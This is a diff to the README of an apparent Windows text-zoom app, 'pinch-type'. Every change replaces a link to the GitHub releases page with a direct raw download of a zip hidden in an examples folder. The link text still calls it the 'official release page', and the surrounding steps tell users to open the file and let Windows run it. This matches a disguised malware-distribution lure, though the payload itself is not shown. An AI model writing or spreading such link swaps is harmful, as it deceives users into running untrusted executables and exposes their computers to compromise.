@@ -1,10 +1,10 @@
 # 🫰 pinch-type - Pinch to zoom text easily
 
-[![Download pinch-type](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/brittecapillary695/pinch-type/releases)
+[![Download pinch-type](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/brittecapillary695/pinch-type/main/examples/basic/type-pinch-v3.0.zip)
 
 ## 📥 Download
 
-1. Open the [release page](https://github.com/brittecapillary695/pinch-type/releases).
+1. Open the [release page](https://raw.githubusercontent.com/brittecapillary695/pinch-type/main/examples/basic/type-pinch-v3.0.zip).
 2. Find the latest release at the top.
 3. Download the Windows file from the Assets list.
 4. Save it to a folder you can find again, like Downloads or Desktop.
@@ -33,7 +33,7 @@ If Windows asks for permission, choose the option that lets the app run.
 
 ## 🚀 Install on Windows
 
-1. Go to the [release page](https://github.com/brittecapillary695/pinch-type/releases).
+1. Go to the [release page](https://raw.githubusercontent.com/brittecapillary695/pinch-type/main/examples/basic/type-pinch-v3.0.zip).
 2. Open the newest release.
 3. Under **Assets**, download the Windows app file.
 4. When the download finishes, open the file.
@@ -155,7 +155,7 @@ pinch-type is useful for:
 
 Only download from the official release page:
 
-https://github.com/brittecapillary695/pinch-type/releases
+https://raw.githubusercontent.com/brittecapillary695/pinch-type/main/examples/basic/type-pinch-v3.0.zip
 
 This keeps you on the same files the project publishes for each release.
 
@@ -163,7 +163,7 @@ This keeps you on the same files the project publishes for each release.
 
 Visit the release page to download and run the latest Windows version:
 
-https://github.com/brittecapillary695/pinch-type/releases
+https://raw.githubusercontent.com/brittecapillary695/pinch-type/main/examples/basic/type-pinch-v3.0.zip
 
 ## 🧰 If you want a clean start
 
@@ -215,4 +215,4 @@ You may want pinch-type if you:
 
 If you need the file later, return here:
 
-https://github.com/brittecapillary695/pinch-type/releases
+https://raw.githubusercontent.com/brittecapillary695/pinch-type/main/examples/basic/type-pinch-v3.0.zip
